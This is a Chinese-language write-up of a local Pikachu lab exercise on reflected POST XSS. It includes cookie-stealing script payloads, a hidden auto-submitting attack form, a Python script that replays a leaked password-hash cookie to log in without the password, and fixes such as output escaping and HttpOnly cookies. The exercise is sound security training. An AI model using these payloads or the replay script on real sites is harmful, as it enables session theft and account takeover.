---
layout: post
title: Pikachu - 反射型 XSS(post) Writeup（含 Pass-the-Hash 实测）
platform: pikachu
date: 2026-10-26 16:15:00 +0800
categories: CTF
---

Pikachu - 反射型 XSS(post) Writeup（含 Pass-the-Hash 实测）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Cross-Site Scripting → 反射型 XSS(post)
- 入口：`http://localhost/pikachu/vul/xss/xsspost/post_login.php`
- 目标页：`http://localhost/pikachu/vul/xss/xsspost/xss_reflected_post.php`
- 题型：Web
- 考点：**POST 型反射 XSS**、**自动提交表单**、**Pass-the-Hash**

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**登录账号**（`users` 表）：

```text
admin   / 123456
pikachu / 000000
test    / abc123
```

**作者留的提示**：

```html
data-content="问题还是那个问题,只是提交方式变成了post,怎么利用?"
```

**✅ 实测结果**

```text
★ 转义测试：message=<b>test</b>
    → 页面回显 <b>test</b>（真的加粗）
    → HTML 未转义，有 XSS

★ 弹窗测试：message=<script>alert(1)</script>
    → 输入框里能输完整（★ 这一关没有 maxlength）
    → 弹窗 "1"                                        ✅

★ cookie 泄露：message=<script>alert(document.cookie)</script>
    → 弹出三个 cookie：
       ant[uname]=admin;
       ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815;
       PHPSESSID=h21jhq7u3kjrbu7gs6ih0jfvp5            ✅

★ Pass-the-Hash 实测：
    只带这两个 cookie（不经过登录页、不输入密码）：
       ant[uname]=admin
       ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815
    → 服务器返回"你已经登陆成功"                          ✅

    对照：不带 cookie
    → 302 重定向到 post_login.php
```

二、题目分析

**① 这一关比上一关（GET）多了三个特点**

| | 反射型 XSS(get) | **反射型 XSS(post)** |
|---|---|---|
| 提交方式 | GET | **POST** |
| 需要登录吗 | ❌ 不需要 | ✅ **需要**（`check_xss_login`）|
| 输入长度限制 | `maxlength="20"` | ❌ **没有限制** |
| 怎么让受害者中招 | 发个链接就够 | **要让他"提交一个表单"** |

**★ 第 4 条就是作者问的"怎么利用"。**

**② 后端代码（关键两行）**

```php
<?php
// xss_reflected_post.php 第 26-46 行

$is_login_id = check_xss_login($link);      // ① 必须登录，否则跳登录页
if(!$is_login_id){
    header("location:post_login.php");
}

$state = '你已经登陆成功,<a href="xss_reflected_post.php?logout=1">退出登陆</a>';
$html = '';
if(isset($_POST['submit'])){
    if(empty($_POST['message'])){
        $html .= "<p class='notice'>输入'kobe'试试-_-</p>";
    } else {
        // ② ★★★ 直接把 POST 参数拼进 HTML，没有任何转义
        if($_POST['message'] == 'kobe'){
            $html .= "<p class='notice'>愿你和{$_POST['message']}一样，永远年轻，永远热血沸腾！</p>
                      <img src='...kobe.png' />";
        } else {
            $html .= "<p class='notice'>who is {$_POST['message']},i don't care!</p>";
        }
    }
}
?>
```

**★ 漏洞点**：

```php
$html .= "<p class='notice'>who is {$_POST['message']},i don't care!</p>";
                                        └───────┬────────┘
                                    用户完全可控，无转义
```

**③ 表单**

```html
<form method="post">
    <input class="xssr_in" type="text" name="message" />       <!-- 没有 maxlength -->
    <input class="xssr_submit" type="submit" name="submit" value="submit" />
</form>
```

**★ 对比上一关**：

```html
<!-- 第 1 关（GET）：有长度限制 -->
<input type="text" maxlength="20" name="message" />

<!-- 第 2 关（POST）：没有限制 -->
<input type="text" name="message" />
```

**★ 所以这一关反而更容易 —— 长载荷可以直接输入，不用改 URL。**

**④ 登录逻辑（这里埋了第二个坑）**

```php
<?php
// post_login.php 第 27-46 行
if(isset($_POST['submit'])){
    if($_POST['username'] && $_POST['password']){

        $username = escape($link, $_POST['username']);
        $password = escape($link, $_POST['password']);

        $query = "select * from users where username='$username' and password=md5('$password')";
        $result = execute($link, $query);

        if(mysqli_num_rows($result) == 1){
            $data = mysqli_fetch_assoc($result);

            // ★★★ 把「用户名」和「密码哈希」直接塞进 cookie
            setcookie('ant[uname]', $_POST['username'], time()+3600);
            setcookie('ant[pw]', sha1(md5($_POST['password'])), time()+3600);

            header("location:xss_reflected_post.php");
        }
    }
}
?>
```

**★ 登录校验函数 `check_xss_login`**：

```php
function check_xss_login($link){
    if(isset($_COOKIE['ant']['uname']) && isset($_COOKIE['ant']['pw'])){
        $username = escape($link, $_COOKIE['ant']['uname']);
        $password = escape($link, $_COOKIE['ant']['pw']);

        // 注意：这里比对的是 sha1(数据库里的密码)
        $query = "select * from users where username='$username' and sha1(password)='$password'";
        $result = execute($link, $query);
        if(mysqli_num_rows($result) == 1){
            return $data['id'];
        }
    }
}
```

**★ 两个问题**：

```text
① 把「密码的哈希」发给客户端
   → 相当于把"密码的等价物"交给浏览器
   → 一旦泄露（XSS/嗅探），攻击者可永久使用

② 没有 HttpOnly
   → document.cookie 能读到
   → XSS 直接拿走
```

**⑤ 核心难点：怎么让受害者"提交一个 POST"**

**这是这一关真正的考点。**

```text
反射型 XSS 的触发条件：
    页面被访问时，参数里带有恶意代码

GET 型：
    参数在 URL 里
    → 发个链接 <a href="...?message=<script>">
    → 或者 <img src="...">
    → 受害者一点就中招

POST 型：
    参数在请求体里
    → 链接发不了（只能 GET）
    → <img> 也发不了
    → ★ 必须用"自动提交的表单"
```

**★ 这就是 CSRF(post) 那关学过的技巧 —— 两关合起来用。**

```html
<form action="http://靶场/.../xss_reflected_post.php" method="POST" id="f" style="display:none">
    <input name="message" value="<script>alert(document.cookie)</script>">
    <input name="submit"  value="submit">
</form>
<script>HTMLFormElement.prototype.submit.call(document.getElementById('f'));</script>
```

**★ 表单提交会"导航"受害者的浏览器到目标页**
**★ 目标页渲染 → `<script>` 执行 → 攻击成立**

**⑥ 还有一个约束：必须在"同站"**

```text
受害者带着 ant[uname] / ant[pw] 两个 cookie
    ↓
自动提交的表单是【跨站 POST】
    ↓
SameSite=Lax 默认策略：跨站 POST 不发送 cookie
    ↓
check_xss_login 失败 → 302 跳登录页 → XSS 不触发

★ 所以攻击页必须放在"同站"
★ 技巧：http://localhost:8000/ 和 http://localhost/ 是【同站】
       （SameSite 不看端口）
```

三、解题步骤

**第 1 步：登录**

```text
① 打开 http://localhost/pikachu/vul/xss/xsspost/post_login.php
② 用 admin / 123456 登录
③ 自动跳到 xss_reflected_post.php
```

**★ 登录后页面显示**：

```
你已经登陆成功,退出登陆

Which NBA player do you like?
[            ] [submit]
```

**第 2 步：确认三个 cookie**

```text
F12 → 【应用】→ Cookie → http://localhost

  ant[uname] = admin
  ant[pw]    = 10470c3b4b1fed12c3baac014be15fac67c6e815
  PHPSESSID  = h21jhq7u3kjrbu7gs6ih0jfvp5
```

**★ 注意 `ant[pw]` 不是明文密码，而是 `sha1(md5(密码))`。**

**第 3 步：测试转义（判断有没有 XSS）**

**在输入框里填**：

```html
<b>test</b>
```

**点 submit → 页面显示**：

```
who is test,i don't care!          ← 真的加粗了
```

**★ HTML 被解析 → 未转义 → 有 XSS。**

**第 4 步：弹窗 + 偷 cookie**

**输入框里填（★ 这关没有 maxlength，能输完）**：

```html
<script>alert(document.cookie)</script>
```

**点 submit → 弹窗**：

```
ant[uname]=admin;
ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815;
PHPSESSID=h21jhq7u3kjrbu7gs6ih0jfvp5
```

**★ 三个 cookie 一次到手。**

**第 5 步：验证 `ant[pw]` 是什么（Pass-the-Hash 第一步）**

**用脚本算一下**：

```python
import hashlib
pw = "123456"
md5 = hashlib.md5(pw.encode()).hexdigest()
sha1_of_md5 = hashlib.sha1(md5.encode()).hexdigest()

print("明文密码       :", pw)
print("md5(密码)      :", md5)
print("sha1(md5(密码)):", sha1_of_md5)
```

**输出**：

```text
明文密码       : 123456
md5(密码)      : e10adc3949ba59abbe56e057f20f883e
sha1(md5(密码)): 10470c3b4b1fed12c3baac014be15fac67c6e815
                 └──────────────────┬──────────────────┘
                        和页面泄露的值完全一致 ✅
```

**★ 结论：`ant[pw]` = `sha1(md5(密码))`，是密码的"等价物"。**

**第 6 步：Pass-the-Hash（不输密码直接登录）**

**只带这两个 cookie 访问目标页**：

```python
import hashlib, urllib.request, urllib.parse

TARGET = "http://localhost/pikachu/vul/xss/xsspost/xss_reflected_post.php"
pw_hash = hashlib.sha1(hashlib.md5(b"123456").hexdigest().encode()).hexdigest()

data = urllib.parse.urlencode({"message": "test", "submit": "submit"}).encode()
req = urllib.request.Request(TARGET, data=data, method="POST", headers={
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "ant[uname]=admin; ant[pw]=%s" % pw_hash,   # ★ 全靠这两个
})

with urllib.request.urlopen(req, timeout=15) as r:
    body = r.read().decode("utf-8", "replace")

print("HTTP", r.status)
print("已登录标记:", "你已经登陆成功" in body)
```

**实测输出**：

```text
HTTP 200
已登录标记: True
★ 服务器认为我已经登录（admin）
★ 我没有输入任何密码，只是把哈希当 cookie 发过去
```

**★ 对照（不带 cookie）**：

```text
HTTP 302 → 重定向到 post_login.php
```

**★ 这就是 Pass-the-Hash：**

```text
正常流程：
    输入明文 → 服务器算 sha1(md5(明文)) → 和数据库比对

被攻击的流程：
    攻击者拿到 sha1(md5(明文)) → 直接当 cookie 发给服务器
    → 服务器比对 → 一致 → 放行

★ 服务器不关心"这个哈希是怎么来的"
★ 它只比较"两个哈希是否相等"
```

**第 7 步：构造攻击页（让受害者自己提交 POST）**

**新建 `xss-post-attack.html`**：

```html
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>加载中...</title></head>
<body>
    <h1>🎬 视频加载中，请稍候...</h1>

    <!-- ★ 隐藏表单：受害者看不见 -->
    <form action="http://localhost/pikachu/vul/xss/xsspost/xss_reflected_post.php"
          method="POST" id="csrfForm" style="display:none">
        <input type="hidden" name="message"
               value="<script>alert(document.cookie)</script>">
        <input type="hidden" name="submit" value="submit">
    </form>

    <script>
        // ★ 注意：name="submit" 会覆盖 form.submit 方法
        //    所以必须用原型上的 submit
        HTMLFormElement.prototype.submit.call(document.getElementById('csrfForm'));
    </script>
</body>
</html>
```

**★ 关键点**：

```text
① action 指向 xss_reflected_post.php
② message 的值就是 XSS 载荷（含引号时需转义，这里没有）
③ 用 HTMLFormElement.prototype.submit.call() 而不是 form.submit()
   （因为 name="submit" 覆盖了 submit 方法 —— 上上关踩过的坑）
```

**第 8 步：部署到"同站"并验证**

**方法 A：起本地 HTTP 服务器（推荐，不用管理员权限）**

```powershell
cd <攻击页所在目录>
python -m http.server 8000
```

**然后访问**：

```text
http://localhost:8000/xss-post-attack.html
```

**★ 为什么 8000 端口也算同站？**

```text
SameSite 判断 site = 协议 + 可注册域名（端口不参与）

    http://localhost:8000   → site = (http, localhost)
    http://localhost:80     → site = (http, localhost)
                              ↑ 同站 → cookie 会带上
```

**方法 B：放进 pikachu 目录**

```powershell
# 需要管理员 PowerShell（D 盘写入权限）
Copy-Item attack.html "D:\phpstudy_pro\WWW\pikachu\"
# 访问 http://localhost/pikachu/attack.html
```

**第 9 步：完整攻击链验证**

```text
① 受害者（浏览器）先登录 post_login.php（有 ant[*] cookie）
② 受害者打开攻击页 http://localhost:8000/xss-post-attack.html
③ 隐藏表单自动提交（POST）
④ 浏览器带着 ant[uname] / ant[pw] → check_xss_login 通过
⑤ 目标页渲染 message → <script> 执行
⑥ 弹窗显示三个 cookie（真实攻击中会发到攻击者服务器）
```

**★ 受害者全程只"打开了一个网页"。**

**第 10 步：验证"跨站"会失败（对照实验）**

**把攻击页放到 `file://` 上双击打开**：

```text
① 双击 xss-post-attack.html（file:// 方式）
② 表单提交 → 跨站 POST → SameSite 拦 cookie
③ 服务器 302 跳到 post_login.php → XSS 不触发
④ 页面停在登录页，没有弹窗
```

**★ 这就是现代浏览器的保护：**

```text
代码有漏洞（未转义）
    +
浏览器有防护（SameSite=Lax）
    =
实际打不通（跨站场景）
```

四、延伸知识

**① GET 型 vs POST 型反射 XSS 的完整对比**

| | 反射型(get) | 反射型(post) |
|---|---|---|
| **参数位置** | URL 查询串 | 请求体 |
| **需要登录** | ❌ | ✅ |
| **长度限制** | `maxlength="20"` | 无 |
| **攻击载荷** | `<a href>` / `<img src>` | **`<form>` + `submit()`** |
| **需要 JS** | ❌ | ✅（自动提交）|
| **需要同站** | 看 SameSite 对 GET 的规则 | ✅ **必须**（POST 一定不带跨站 cookie）|
| **社工难度** | 中（发链接） | 高（要让他提交表单）|

**★ 结论**：

```text
POST 型反射 XSS 比 GET 型难利用
    → 需要"自动提交表单"
    → 还需要"同站"（否则 cookie 不发送）
    
★ 但一旦满足条件，效果完全一样（都能执行任意 JS）
```

**② 自动提交表单：CSRF 和 XSS 的"合体技"**

**这段代码你在 CSRF(post) 那关已经写过一遍了**：

```html
<form action="目标" method="POST" id="f" style="display:none">
    <input name="参数" value="值">
</form>
<script>HTMLFormElement.prototype.submit.call(document.getElementById('f'));</script>
```

**★ 用途的两种组合**：

```text
CSRF（无 XSS）：
    表单提交 → 服务器执行操作
    ★ 攻击者在"借刀"（借受害者的 cookie）
    ★ 攻击者读不到响应

XSS（有反射点）：
    表单提交 → 服务器把参数反射进页面 → <script> 执行
    ★ 攻击者"进入了受害者的浏览器"
    ★ 攻击者能读能写（通过 JS）
```

**★ 所以**：

```text
CSRF = 只借手
XSS  = 整个身体
CSRF + XSS = 先借手把手伸进去，然后就自由了
```

**③ Why `name="submit"` 会踩坑（再强调一次）**

```html
<form id="f">
    <input name="submit" value="submit">     <!-- ★ 这个会覆盖 form.submit -->
</form>

<script>
    document.getElementById('f').submit();   // ❌ TypeError: not a function
</script>
```

**原因**：

```text
HTML 表单对象的内置属性：
    form.submit    ← 方法
    form.action    ← 属性
    form.method    ← 属性
    form.length    ← 属性
    form.elements  ← 属性

表单里的 <input name="submit"> 
    → 会把 form.submit 覆盖成那个 DOM 元素
    → form.submit() 就报 "is not a function"
```

**正确写法**：

```javascript
// ✅ 绕过属性覆盖，直接调用原型方法
HTMLFormElement.prototype.submit.call(document.getElementById('f'));

// ✅ 或者用 requestSubmit（名字不冲突）
document.getElementById('f').requestSubmit();
```

**★ 验证方法（控制台）**：

```javascript
var f = document.getElementById('f');
console.log(typeof f.submit);   // "object"（不是 "function"！）
console.log(f.submit);          // <input name="submit" ...>
```

**④ Pass-the-Hash：比偷 cookie 更严重的问题**

**先看现象**：

```text
服务器只比较"两个哈希是否相等"
完全不关心"这个哈希是怎么算出来的"

★ 所以攻击者只要能拿到哈希，就直接能用
★ 不需要知道明文密码
```

**对比两种泄露**：

| | 偷 `PHPSESSID` | **偷 `ant[pw]`** |
|---|---|---|
| 有效期 | 会话结束就失效 | **只要密码不变，永久有效** |
| 改密码能救吗 | ✅ 能 | ✅ 能（哈希会变）|
| 需要明文密码吗 | — | ❌ **不需要** |
| 能反复用吗 | 看会话 | ✅ **可以，每次有效** |
| 危害 | 中 | **高** |

**★ 这类问题在真实世界的名字**：

```text
· Pass-the-Hash（传递哈希）
· Pass-the-Cookie
· 凭证重放（Credential Replay）

★ 常见于 Windows 域环境（NTLM 哈希传递）
★ 也常见于"把密码哈希存到 cookie/localStorage"的网站
```

**⑤ 正确的 cookie 设计应该是什么样**

**本关的错误做法**：

```php
// ❌ 把用户名 + 密码哈希塞进 cookie
setcookie('ant[uname]', $_POST['username'], time()+3600);
setcookie('ant[pw]', sha1(md5($_POST['password'])), time()+3600);
```

**正确做法**：

```php
// ✅ 只给一个随机会话 ID
session_start();
$_SESSION['user_id'] = $data['id'];
$_SESSION['username'] = $data['username'];
// 服务器端 session 文件保存身份信息
// cookie 里只有 PHPSESSID（随机、不可预测）

// ✅ 再加 HttpOnly（JS 读不到）
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'httponly' => true,        // ★ XSS 读不到
    'secure'   => true,        // 只在 HTTPS
    'samesite' => 'Lax',       // 防 CSRF
]);
```

**★ 三个原则**：

```text
① cookie 里只放"随机会话 ID"
   → 不放用户名、不放密码、不放密码哈希

② 身份信息存在【服务器端 session】
   → cookie 只是"取货凭证"

③ 加 HttpOnly + Secure + SameSite
   → JS 读不到 / 只走 HTTPS / 跨站不发送
```

**⑥ HttpOnly 的实验（本关没开，所以能偷）**

**看 php.ini**：

```ini
;session.cookie_httponly =        ← 注释掉的，等于没启用
session.cookie_lifetime = 0
session.cookie_path = /
```

**如果开了会怎样**：

```php
// php.ini
session.cookie_httponly = 1
```

**效果**：

```javascript
document.cookie
// 输出：""（空的，或者只有别的非 HttpOnly cookie）
// ★ XSS 还在（还能改页面、发请求、钓鱼）
// ★ 但偷不到会话凭证了
// ★ 危害从"账号被盗"降到"页面被篡改"
```

**★ 但注意**：

```
HttpOnly 只保护 session cookie
本关的 ant[uname] / ant[pw] 是用 setcookie() 单独设的
→ 需要显式加 HttpOnly 参数：
   setcookie('ant[pw]', $v, ['httponly' => true, 'samesite' => 'Lax']);
```

**⑦ XSS + Pass-the-Hash 的完整危害链**

```text
① 攻击者发现反射型 XSS（POST）
        ↓
② 构造自动提交表单（含盗 cookie 的 JS）
        ↓
③ 放在同站位置，诱导受害者打开
        ↓
④ 表单提交 → 页面渲染 → JS 执行
        ↓
⑤ JS 把 ant[uname] + ant[pw] 发到攻击者服务器
        ↓
⑥ 攻击者直接用这两个 cookie 登录
        ↓
⑦ 永久有效（只要受害者不改密码）
        ↓
★ 比偷 PHPSESSID 更狠：不需要等受害者在线
```

**⑧ 防御清单**

| 层级 | 措施 | 本关做了吗 |
|---|---|---|
| **输出转义** | `htmlspecialchars()` | ❌ 没做（漏洞根源）|
| **cookie 设计** | 只放随机 session ID | ❌ 放了密码哈希 |
| **HttpOnly** | JS 读不到 cookie | ❌ 没开 |
| **SameSite** | 跨站不发送 cookie | ⚠️ 浏览器默认 Lax（帮了忙）|
| **CSP** | 禁止内联脚本 | ❌ 没有 |
| **密码哈希** | 存服务器端，不出网 | ❌ 出网了 |

**★ 只要做对第一条（输出转义），后面全都不需要。**

```php
// 一行代码解决根本问题
$safe = htmlspecialchars($_POST['message'], ENT_QUOTES, 'UTF-8');
$html .= "<p class='notice'>who is {$safe},i don't care!</p>";
```

五、总结

- **本题核心：`$_POST['message']` 被直接拼接进 HTML；难点不在注入，而在"怎么让受害者提交 POST"。**

- **关键代码（一行）**：

```php
$html .= "<p class='notice'>who is {$_POST['message']},i don't care!</p>";
```

- **⭐ 四个必记要点**：

```text
① POST 型反射 XSS 需要"自动提交表单"
   → 和 CSRF(post) 用的是同一套载荷
   → 并且必须放在同站（否则 SameSite 拦 cookie）

② 这一关没有 maxlength
   → 长载荷可以直接输入，比 GET 那关更容易

③ ant[pw] = sha1(md5(密码)) 是"密码的等价物"
   → 拿到就能永久登录（Pass-the-Hash）
   → 不需要明文密码

④ name="submit" 会覆盖 form.submit()
   → 必须用 HTMLFormElement.prototype.submit.call(form)
```

- **实测数据**：

```text
转义测试：<b>test</b> → 页面真的加粗      → 未转义 ✅
弹窗测试：<script>alert(1)</script>       → 弹窗 ✅
偷 cookie：弹出 ant[uname] / ant[pw] / PHPSESSID ✅

Pass-the-Hash：
    只带 ant[uname]=admin + ant[pw]=10470c3b... 
    → HTTP 200，"你已经登陆成功"            ✅
    不带 cookie → 302 → post_login.php
```

- **XSS 模块进度**：

```text
✅ 反射型xss(get)      —— 直接拼接，需改 URL 绕 maxlength
✅ 反射型xss(post)     —— 本题：需登录 + 自动提交表单 + Pass-the-Hash
⬜ 存储型xss           —— 最危险（持久化，不需要社工）
⬜ DOM型xss            —— 客户端 JS 导致的
⬜ DOM型xss-x          —— DOM 型进阶
⬜ xss之盲打           —— 后台触发
⬜ xss之过滤           —— 绕过过滤
⬜ xss之htmlspecialchars —— 防护演示
⬜ xss之href输出        —— 属性上下文
⬜ xss之js输出          —— JS 上下文
```

**手工复现要点**：

```text
· 登录 post_login.php（admin/123456）
· 输入 <b>test</b> → 确认未转义
· 输入 <script>alert(document.cookie)</script> → 看三个 cookie
· F12 应用里确认 ant[pw] = sha1(md5("123456"))
· 用脚本只带这两个 cookie 访问 → 免密登录成功
· 写自动提交表单的攻击页 → 部署到 localhost:8000 → 验证
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  POST 型反射 XSS = 反射点 + CSRF 的投递手法                   │
│                                                            │
│  注入点：message 参数（无转义）                               │
│  投递器：自动提交的 <form>（因为没有链接能发 POST）             │
│  前提：  同站（否则 SameSite 拦 cookie）                      │
│                                                            │
│  ★ 附加伤害：这一关把密码哈希放进了 cookie                     │
│  ★ 一次 XSS = 三个 cookie + 永久免密登录                      │
└────────────────────────────────────────────────────────────┘
```
